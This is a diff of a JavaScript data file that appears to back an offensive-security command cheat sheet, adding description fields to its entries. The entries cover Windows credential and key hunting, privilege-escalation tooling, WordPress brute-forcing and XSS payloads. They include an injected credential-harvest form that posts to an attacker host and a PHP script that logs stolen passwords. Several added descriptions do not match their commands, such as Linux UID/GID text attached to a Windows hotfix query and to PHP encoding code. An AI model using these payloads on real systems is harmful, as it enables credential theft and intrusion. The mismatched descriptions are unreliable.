+          "label": "Find KeePass DBs (.kdbx)",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search XAMPP dir for config files with creds",
-          "label": "Find configs in xampp"
+          "label": "Find configs in xampp",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search user profiles for sensitive documents",
-          "label": "Find office docs in Users"
+          "label": "Find office docs in Users",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Hunt unattend.xml (may contain base64 admin password)",
-          "label": "Find unattend/sysprep XML"
+          "label": "Find unattend/sysprep XML",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         }
       ],
       "defense": {
@@ -168059,37 +169123,44 @@ const COMMAND_DATA = {
         {
           "command": "Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search XAMPP directory for config files with credentials",
-          "label": "Find configs in xampp"
+          "label": "Find configs in xampp",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search all user profiles for document files",
-          "label": "Find office docs in Users"
+          "label": "Find office docs in Users",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\ -Include web.config,*.config,appsettings.json,*.env -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Hunt for web app config files with DB credentials",
-          "label": "Find web.config"
+          "label": "Find web.config",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\ -Include id_rsa,*.pem,*.ppk -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Hunt for SSH private keys",
-          "label": "Find id_rsa"
+          "label": "Find id_rsa",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\inetpub -Include *.config,*.xml -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password|connectionString' -CaseSensitive:$false",
           "caption": "IIS config: find and grep for password strings",
-          "label": "Find *.config"
+          "label": "Find *.config",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path 'C:\\Program Files' -Include *.conf,*.cfg,*.ini -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search program files for configuration files",
-          "label": "Find *.conf"
+          "label": "Find *.conf",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         },
         {
           "command": "Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml,unattended.xml -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Hunt for unattend.xml (may contain base64-encoded admin passwords)",
-          "label": "Find unattend.xml"
+          "label": "Find unattend.xml",
+          "description": "Recursively searches for specific file types across directories. Used to locate configuration files, scripts, or documents that may contain sensitive information."
         }
       ],
       "examples": [
@@ -168673,52 +169744,62 @@ const COMMAND_DATA = {
         {
           "command": "Get-LocalGroupMember Administrators",
           "caption": "List members of local Administrators group",
-          "label": "Local Administrators members"
+          "label": "Local Administrators members",
+          "description": "Lists all members of the local Administrators group on the current machine. Identifies who has full local admin access - includes domain users/groups that have been granted local admin."
         },
         {
           "command": "Get-LocalGroupMember '<group>'",
           "caption": "List members of any local group",
-          "label": "Members of a named group"
+          "label": "Members of a named group",
+          "description": "Lists members of a specific local group. Useful for identifying who has been granted specific local permissions (Remote Desktop Users, Backup Operators, etc.)."
         },
         {
           "command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName",
           "caption": "List installed 64-bit software from registry",
-          "label": "Installed software (64-bit)"
+          "label": "Installed software (64-bit)",
+          "description": "Lists installed 64-bit software by reading the registry uninstall key. Identifies installed applications, versions, and potential vulnerable software for privilege escalation."
         },
         {
           "command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName",
           "caption": "List installed 32-bit software (WOW6432Node)",
-          "label": "Installed software (32-bit)"
+          "label": "Installed software (32-bit)",
+          "description": "Lists 32-bit software installed on a 64-bit system by reading the WOW64 registry uninstall key. Some applications only appear here (not in the 64-bit registry hive) - ensures complete software inventory."
         },
         {
           "command": "Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}",
           "caption": "List all running Windows services with binary paths",
-          "label": "Running services"
+          "label": "Running services",
+          "description": "Enumerates Windows services via WMI. Returns service name, display name, state, start mode, and the account they run as - identifies high-privilege service accounts and misconfigured services."
         },
         {
           "command": "Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq 'Security Update' } | Select-Object HotFixID, InstalledOn | Sort-Object InstalledOn",
           "caption": "List installed security patches (for missing patch research)",
-          "label": "Installed security hotfixes"
+          "label": "Installed security hotfixes",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "command": "Get-History",
           "caption": "Show PowerShell command history for current session",
-          "label": "Get-History"
+          "label": "Get-History",
+          "description": "Reads the PowerShell command history of the current or another user. Previous commands often contain plaintext passwords, credentials in command-line arguments, and connection strings."
         },
         {
           "command": "Get-Content \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"",
           "caption": "Read persistent PS history file (survives session restarts - often has creds)",
-          "label": "Get-Content"
+          "label": "Get-Content",
+          "description": "Reads the PowerShell command history file. Previous commands often contain plaintext passwords, connection strings, and other credentials typed on the command line."
         },
         {
           "command": "Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet",
           "caption": "Enumerate all local user accounts",
-          "label": "Get-LocalUser"
+          "label": "Get-LocalUser",
+          "description": "Lists local user accounts on the machine. Shows enabled/disabled status, last logon, and password expiry - identifies service accounts and dormant local accounts."
         },
         {
           "command": "Get-CimInstance win32_service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService'} | Select-Object Name, StartName, PathName",
           "caption": "Find services running under non-standard service accounts (privesc targets)",
-          "label": "Services w/ non-default account"
+          "label": "Services w/ non-default account",
+          "description": "Enumerates Windows services via WMI. Returns service name, display name, state, start mode, and the account they run as - identifies high-privilege service accounts and misconfigured services."
         }
       ],
       "examples": [
@@ -169173,15 +170254,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "winPEAS / Seatbelt",
-          "command": ".\\winPEASx64.exe\n.\\Seatbelt.exe -group=all"
+          "command": ".\\winPEASx64.exe\n.\\Seatbelt.exe -group=all",
+          "description": "Runs winPEAS automated Windows privilege escalation checker. Scans for misconfigurations, weak permissions, stored credentials, and other privesc vectors with color-coded output."
         },
         {
           "label": "PowerUp / SharpUp",
-          "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"\n.\\SharpUp.exe audit"
+          "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"\n.\\SharpUp.exe audit",
+          "description": "Runs SharpUp for automated Windows privilege escalation checks. Identifies vulnerable services, registry autoruns, modifiable scheduled tasks, and other common privesc vectors."
         },
         {
           "label": "Others",
-          "command": "# JAWS, Watson, wesng, LaZagne, SessionGopher, Sysinternals (accesschk/pipelist/psservice)"
+          "command": "# JAWS, Watson, wesng, LaZagne, SessionGopher, Sysinternals (accesschk/pipelist/psservice)",
+          "description": "Extracts stored credentials from various applications using LaZagne. Harvests passwords from browsers, email clients, and other software that caches credentials."
         }
       ],
       "opsec": "moderate",
@@ -169280,27 +170364,33 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "System / patches",
-          "command": "systeminfo\nwmic qfe\nGet-HotFix | ft -AutoSize\nset"
+          "command": "systeminfo\nwmic qfe\nGet-HotFix | ft -AutoSize\nset",
+          "description": "Displays detailed system information including OS version, architecture, domain, hotfixes, and network configuration. Used to identify the OS build for kernel exploit selection."
         },
         {
           "label": "Processes / services",
-          "command": "tasklist /svc\nsc query\nwmic product get name\nGet-WmiObject -Class Win32_Product | select Name,Version"
+          "command": "tasklist /svc\nsc query\nwmic product get name\nGet-WmiObject -Class Win32_Product | select Name,Version",
+          "description": "Lists running processes and their PIDs. Identifies security products (AV/EDR), running services, and applications for targeting or evasion planning."
         },
         {
           "label": "Network",
-          "command": "netstat -ano\nipconfig /all\narp -a\nroute print"
+          "command": "netstat -ano\nipconfig /all\narp -a\nroute print",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         },
         {
           "label": "CimInstance services",
-          "command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\nGet-CimInstance win32_service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService'} | Select Name,StartName,PathName"
+          "command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\nGet-CimInstance win32_service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService'} | Select Name,StartName,PathName",
+          "description": "CimInstance services - outputs Name, State, PathName, with targeted filtering."
         },
         {
           "label": "CimInstance patches",
-          "command": "Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq 'Security Update' } | Select HotFixID,InstalledOn | Sort InstalledOn"
+          "command": "Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq 'Security Update' } | Select HotFixID,InstalledOn | Sort InstalledOn",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "PS history",
-          "command": "Get-History\nGet-Content \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\""
+          "command": "Get-History\nGet-Content \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"",
+          "description": "Reads the PowerShell command history of the current or another user. Previous commands often contain plaintext passwords, credentials in command-line arguments, and connection strings."
         }
       ],
       "opsec": "moderate",
@@ -169565,19 +170655,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Current token",
-          "command": "whoami /priv\nwhoami /groups\nwhoami /user\necho %USERNAME%"
+          "command": "whoami /priv\nwhoami /groups\nwhoami /user\necho %USERNAME%",
+          "description": "Shows the current user's security privileges. Identifies exploitable privileges like SeImpersonatePrivilege (Potato attacks), SeBackupPrivilege (file read), or SeDebugPrivilege (process injection)."
         },
         {
           "label": "Local users/groups",
-          "command": "net user\nnet localgroup\nnet localgroup administrators\nnet accounts\nquery user"
+          "command": "net user\nnet localgroup\nnet localgroup administrators\nnet accounts\nquery user",
+          "description": "Enumerates local or domain user accounts using the net command. Built-in Windows tool that works without importing modules - useful for initial enumeration from a basic shell."
         },
         {
           "label": "PS local groups",
-          "command": "Get-LocalGroup | Select-Object Name,Description\nGet-LocalGroupMember Administrators\nGet-LocalGroupMember '<group>'"
+          "command": "Get-LocalGroup | Select-Object Name,Description\nGet-LocalGroupMember Administrators\nGet-LocalGroupMember '<group>'",
+          "description": "Lists all local security groups on the machine. Shows available groups beyond the defaults - custom groups may reveal additional privilege boundaries."
         },
         {
           "label": "Installed software (registry)",
-          "command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select DisplayName,DisplayVersion\nGet-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select DisplayName,DisplayVersion"
+          "command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select DisplayName,DisplayVersion\nGet-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select DisplayName,DisplayVersion",
+          "description": "Installed software (registry) - outputs DisplayName, DisplayVersion."
         }
       ],
       "opsec": "moderate",
@@ -169907,11 +171001,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Nmap WinRM scan",
-          "command": "nmap -sV -sC <ip> -p5985,5986 --disable-arp-ping -n"
+          "command": "nmap -sV -sC <ip> -p5985,5986 --disable-arp-ping -n",
+          "description": "Runs an nmap scan with version detection, default scripts, aggressive mode (OS detection, versions, scripts, traceroute) for detailed service enumeration and target analysis."
         },
         {
           "label": "wmiexec command",
-          "command": "/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@<ip> \"hostname\""
+          "command": "/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@<ip> \"hostname\"",
+          "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
         }
       ],
       "opsec": "moderate",
@@ -170182,19 +171278,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Passwords",
-          "command": "/usr/share/wordlists/rockyou.txt\n/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt\n/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt\n/usr/share/seclists/Passwords/darkweb2017-top10000.txt\n/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
+          "command": "/usr/share/wordlists/rockyou.txt\n/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt\n/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt\n/usr/share/seclists/Passwords/darkweb2017-top10000.txt\n/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt",
+          "description": "References a standard wordlist used in brute-force attacks. Common wordlists include rockyou.txt (passwords), directory-list (web paths), and subdomain lists for DNS enumeration."
         },
         {
           "label": "Web content / dirs",
-          "command": "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n/usr/share/seclists/Discovery/Web-Content/common.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n/usr/share/wordlists/dirb/common.txt\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+          "command": "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n/usr/share/seclists/Discovery/Web-Content/common.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n/usr/share/wordlists/dirb/common.txt\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+          "description": "References a standard wordlist used in brute-force attacks. Common wordlists include rockyou.txt (passwords), directory-list (web paths), and subdomain lists for DNS enumeration."
         },
         {
           "label": "Subdomains / DNS",
-          "command": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n/usr/share/seclists/Discovery/DNS/namelist.txt"
+          "command": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n/usr/share/seclists/Discovery/DNS/namelist.txt",
+          "description": "References a standard wordlist used in brute-force attacks. Common wordlists include rockyou.txt (passwords), directory-list (web paths), and subdomain lists for DNS enumeration."
         },
         {
           "label": "Usernames / files",
-          "command": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt\n/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt\n/usr/share/seclists/Discovery/Web-Content/LFI/LFI-Jhaddix.txt"
+          "command": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt\n/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt\n/usr/share/seclists/Discovery/Web-Content/LFI/LFI-Jhaddix.txt",
+          "description": "References a standard wordlist used in brute-force attacks. Common wordlists include rockyou.txt (passwords), directory-list (web paths), and subdomain lists for DNS enumeration."
         }
       ],
       "opsec": "silent",
@@ -170636,11 +171736,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Version from meta/readme",
-          "command": "curl -s http://<url>/readme.html | grep -i version"
+          "command": "curl -s http://<url>/readme.html | grep -i version",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "Enumerate via wpscan",
-          "command": "wpscan --url http://<url> --no-update"
+          "command": "wpscan --url http://<url> --no-update",
+          "description": "Scans a WordPress site for vulnerabilities, misconfigurations, and outdated components using wpscan."
         }
       ],
       "explain": "Detects WordPress and enumerates themes/plugins from the page source:\n  curl -s http://<url>/   fetch the homepage\n  | grep -E 'WordPress|themes|plugins'   pull WordPress markers and asset links\nConfirms the CMS and reveals active themes/plugins passively; a plugin's /wp-content/plugins/<name>/readme.txt usually leaks its version for CVE matching."
@@ -171681,11 +172783,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Vulnerable plugins + users",
-          "command": "wpscan --url http://<url> --enumerate vp,u --api-token <token>"
+          "command": "wpscan --url http://<url> --enumerate vp,u --api-token <token>",
+          "description": "Vulnerable plugins + users. See the command syntax for exact parameters and flags."
         },
         {
           "label": "All plugins (aggressive)",
-          "command": "wpscan --url http://<url> --enumerate ap --plugins-detection aggressive"
+          "command": "wpscan --url http://<url> --enumerate ap --plugins-detection aggressive",
+          "description": "Scans a WordPress site for vulnerabilities, misconfigurations, and outdated components using wpscan."
         }
       ],
       "steps": [
@@ -171881,7 +172985,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Multiple users",
-          "command": "wpscan --url http://<url> -U users.txt -P rockyou.txt --password-attack wp-login"
+          "command": "wpscan --url http://<url> -U users.txt -P rockyou.txt --password-attack wp-login",
+          "description": "Scans a WordPress site for vulnerabilities, misconfigurations, and outdated components using wpscan."
         }
       ],
       "explain": "Brute-forces a WordPress account through the XML-RPC endpoint:\n  wpscan                   the WordPress scanner\n  --password-attack xmlrpc  use xmlrpc (faster/quieter than wp-login)\n  -t 20                    20 threads\n  -U <user> -P <wordlist>  the target user and password list\n  --url http://<url>       the site\nRecovered admin creds lead to code execution via the theme editor."
@@ -172691,7 +173796,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Close tag then inject",
-          "command": "\"><svg/onload=alert(window.origin)>"
+          "command": "\"><svg/onload=alert(window.origin)>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         }
       ],
       "explain": "Breaks out of an HTML attribute the input is placed inside before injecting the script.:\n  \"><script>alert(window.origin)</script>\nTry both \"> and '> depending on which quote wraps the attribute."
@@ -172878,11 +173984,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Crawl the whole site",
-          "command": "python xsstrike.py -u \"<url>\" --crawl"
+          "command": "python xsstrike.py -u \"<url>\" --crawl",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         },
         {
           "label": "Test POST parameters",
-          "command": "python xsstrike.py -u \"<url>\" --data \"task=test\""
+          "command": "python xsstrike.py -u \"<url>\" --data \"task=test\"",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         }
       ],
       "explain": "Runs XSStrike, an automated XSS fuzzer, against a parameterized URL.:\n  -u <url>?task=test  username / user to authenticate as\n  <url>               target URL\nClone and set up first: git clone https://github.com/s0md3v/XSStrike.git; cd XSStrike; pip install -r requirements.txt."
@@ -173826,15 +174934,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Attribute breakout",
-          "command": "\"><script>alert(window.origin)</script>"
+          "command": "\"><script>alert(window.origin)</script>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "Event handler (no script tag)",
-          "command": "\" onmouseover=alert(document.domain) x=\""
+          "command": "\" onmouseover=alert(document.domain) x=\"",
+          "description": "Event handler (no script tag). See the command syntax for exact parameters and flags."
         },
         {
           "label": "IMG onerror",
-          "command": "<img src=x onerror=alert(document.domain)>"
+          "command": "<img src=x onerror=alert(document.domain)>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         }
       ],
       "explain": "The standard payload to confirm an input is XSS-injectable.:\n  <script>alert(window.origin)</script>\nView the rendered source with Ctrl+U to confirm your input landed inside HTML, not encoded."
@@ -174024,11 +175135,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SVG onload",
-          "command": "<svg onload=alert(document.domain)>"
+          "command": "<svg onload=alert(document.domain)>",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "iframe javascript:",
-          "command": "<iframe src=\"javascript:alert(document.domain)\">"
+          "command": "<iframe src=\"javascript:alert(document.domain)\">",
+          "description": "Iframe javascript:. See the command syntax for exact usage and parameters."
         }
       ],
       "explain": "DOM-based XSS payload for when user input reaches a client-side sink (like element.innerHTML) without ever touching the server.:\n  <img src=\"\" onerror=alert(window.origin)>\nFind the source (e.g. document.URL, location.hash, a task= parameter) and the sink (e.g. document.getElementById(...).innerHTML)."
@@ -174221,7 +175334,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Inject a credential-harvest form via document.write",
-          "command": "<script>document.write('<form action=\"http://<attacker>/log\"><input name=user><input name=pass type=password><input type=submit></form>')</script>"
+          "command": "<script>document.write('<form action=\"http://<attacker>/log\"><input name=user><input name=pass type=password><input type=submit></form>')</script>",
+          "description": "Inject a credential-harvest form via document.write. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -174326,7 +175440,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Quick listener — raw HTTP only (no PHP required)",
-          "command": "sudo nc -lvnp 80"
+          "command": "sudo nc -lvnp 80",
+          "description": "Quick listener — raw HTTP only (no PHP required). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Hosts the attacker-side collector for the XSS phishing form.\nThe index.php below writes any submitted username/password to creds.txt and redirects the victim back to the real login so nothing looks off.\nindex.php: <?php if (isset($_GET['username']) && isset($_GET['password'])) { $file = fopen(\"creds.txt\", \"a+\"); fputs($file, \"Username: {$_GET['username']} | Password: {$_GET['password']}\\n\"); header(\"Location: http://<ip>/phishing/index.php\"); fclose($file); exit(); } ?>  -- Setup: mkdir /tmp/tmpserver; cd /tmp/tmpserver; vi index.php; sudo php -S 0.0.0.0:80."
@@ -174362,23 +175477,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Dangerous JS Sinks",
-          "command": "// NEVER pass unsanitized user input into any of these:\n\n// Vanilla JS - write raw HTML into the DOM:\nelement.innerHTML = userInput;       // parses HTML, executes event handlers\nelement.outerHTML = userInput;       // same risk, replaces element itself\ndocument.write(userInput);           // overwrites the page\ndocument.writeln(userInput);\ndocument.domain = userInput;\n\n// jQuery - writes raw HTML:\n$(selector).html(userInput);         // identical to innerHTML\n$(selector).parseHTML(userInput);\n$(selector).add(userInput);\n$(selector).append(userInput);\n$(selector).prepend(userInput);\n$(selector).after(userInput);\n$(selector).insertAfter(userInput);\n$(selector).before(userInput);\n$(selector).insertBefore(userInput);\n$(selector).replaceAll(userInput);\n$(selector).replaceWith(userInput);\n\n// Safe alternative - text only, never parses HTML:\nelement.textContent = userInput;     // use this instead of innerHTML"
+          "command": "// NEVER pass unsanitized user input into any of these:\n\n// Vanilla JS - write raw HTML into the DOM:\nelement.innerHTML = userInput;       // parses HTML, executes event handlers\nelement.outerHTML = userInput;       // same risk, replaces element itself\ndocument.write(userInput);           // overwrites the page\ndocument.writeln(userInput);\ndocument.domain = userInput;\n\n// jQuery - writes raw HTML:\n$(selector).html(userInput);         // identical to innerHTML\n$(selector).parseHTML(userInput);\n$(selector).add(userInput);\n$(selector).append(userInput);\n$(selector).prepend(userInput);\n$(selector).after(userInput);\n$(selector).insertAfter(userInput);\n$(selector).before(userInput);\n$(selector).insertBefore(userInput);\n$(selector).replaceAll(userInput);\n$(selector).replaceWith(userInput);\n\n// Safe alternative - text only, never parses HTML:\nelement.textContent = userInput;     // use this instead of innerHTML",
+          "description": "Dangerous JS Sinks. See the command syntax for exact usage and parameters."
         },
         {
           "label": "PHP Output Encoding",
-          "command": "<?php\n// ALWAYS encode before rendering user input into HTML:\n\n// htmlspecialchars - encode <, >, \", ', & into HTML entities:\necho htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');\n// e.g. <script> becomes &lt;script&gt; - browser displays it, never executes it\n\n// htmlentities - similar but encodes more characters:\necho htmlentities($userInput, ENT_QUOTES, 'UTF-8');\n\n// addslashes - escapes special chars with backslash (for JS strings):\n$safe = addslashes($userInput);\n\n// filter_var - validate structure (email, URL, int, etc.):\nif (filter_var($input, FILTER_VALIDATE_EMAIL)) {\n    // valid email - process\n} else {\n    // reject\n}\n\n// NEVER:\necho $userInput;                         // raw reflection\necho '<div>' . $_GET['q'] . '</div>';   // direct concatenation\n\n// Templating engines (Twig, Blade) auto-escape by default:\n// {{ userInput }}  ->  safe\n// {{ userInput|raw }}  ->  DANGEROUS"
+          "command": "<?php\n// ALWAYS encode before rendering user input into HTML:\n\n// htmlspecialchars - encode <, >, \", ', & into HTML entities:\necho htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');\n// e.g. <script> becomes &lt;script&gt; - browser displays it, never executes it\n\n// htmlentities - similar but encodes more characters:\necho htmlentities($userInput, ENT_QUOTES, 'UTF-8');\n\n// addslashes - escapes special chars with backslash (for JS strings):\n$safe = addslashes($userInput);\n\n// filter_var - validate structure (email, URL, int, etc.):\nif (filter_var($input, FILTER_VALIDATE_EMAIL)) {\n    // valid email - process\n} else {\n    // reject\n}\n\n// NEVER:\necho $userInput;                         // raw reflection\necho '<div>' . $_GET['q'] . '</div>';   // direct concatenation\n\n// Templating engines (Twig, Blade) auto-escape by default:\n// {{ userInput }}  ->  safe\n// {{ userInput|raw }}  ->  DANGEROUS",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "DOMPurify (Front-end)",
-          "command": "<!-- Include DOMPurify before use: -->\n<script type=\"text/javascript\" src=\"dist/purify.min.js\"></script>\n\n<script>\n// Sanitize any HTML string before inserting into the DOM:\nlet clean = DOMPurify.sanitize(dirty);\ndocument.getElementById('output').innerHTML = clean;\n// DOMPurify strips dangerous tags and event handlers, leaves safe HTML\n\n// Node.js backend (same library):\nimport DOMPurify from 'dompurify';\nlet clean = DOMPurify.sanitize(dirty);\n\n// Strict mode - strip ALL HTML, output plain text only:\nlet text = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });\n</script>"
+          "command": "<!-- Include DOMPurify before use: -->\n<script type=\"text/javascript\" src=\"dist/purify.min.js\"></script>\n\n<script>\n// Sanitize any HTML string before inserting into the DOM:\nlet clean = DOMPurify.sanitize(dirty);\ndocument.getElementById('output').innerHTML = clean;\n// DOMPurify strips dangerous tags and event handlers, leaves safe HTML\n\n// Node.js backend (same library):\nimport DOMPurify from 'dompurify';\nlet clean = DOMPurify.sanitize(dirty);\n\n// Strict mode - strip ALL HTML, output plain text only:\nlet text = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });\n</script>",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "CSP & Security Headers",
-          "command": "# HTTP response headers to configure (nginx / Apache / Express):\n\n# Content Security Policy - restricts script sources:\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\n# script-src 'self' = only scripts from same domain, no inline JS, no external JS\n# To allow a specific CDN:\nContent-Security-Policy: script-src 'self' https://cdn.example.com;\n\n# Prevent MIME type sniffing:\nX-Content-Type-Options: nosniff\n\n# Legacy XSS filter (IE/old Chrome - mostly superseded by CSP):\nX-XSS-Protection: 1; mode=block\n\n# Referrer policy:\nReferrer-Policy: strict-origin-when-cross-origin\n\n# Enforce HTTPS:\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n\n# Express.js (Helmet):\napp.use(helmet());  // sets all of the above automatically\n\n# nginx location block example:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\";\nadd_header X-Content-Type-Options nosniff;"
